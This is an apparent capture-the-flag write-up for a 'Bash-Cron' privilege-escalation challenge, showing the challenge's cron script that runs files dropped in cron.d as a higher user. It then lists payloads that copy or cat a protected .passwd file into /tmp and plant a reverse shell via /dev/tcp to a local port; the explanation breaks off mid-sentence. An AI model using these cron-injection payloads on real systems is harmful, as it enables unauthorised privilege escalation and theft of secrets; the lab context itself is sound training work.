---
layout: default
title: Bash-Cron
---
This is the bash script we are being given:

```bash
#!/bin/bash

# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr
exec 1>/dev/null 2>&1

wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"


if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi

ls -1a "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done

rm -rf cron.d/*
```

It executes this script every minute as a higher user (at least I think that what the comment in French says up there.)

It executes all the tasks that located under the folder `cron.d/`, and then deletes them.
We can 

```bash
#!/bin/bash
mkdir -p /tmp/LOL
cp ~/.passwd /tmp/LOL/.passwd
```

```bash
echo '#!/bin/sh\ncat .passwd > /tmp/whatever' > cron.d/task1;chmod 4777 cron.d/task1
```

```bash
echo '#!/bin/sh\nbash -i >& /dev/tcp/127.0.0.1/1337 0>&1' > cron.d/bla; chmod 4777 cron.d/bla
```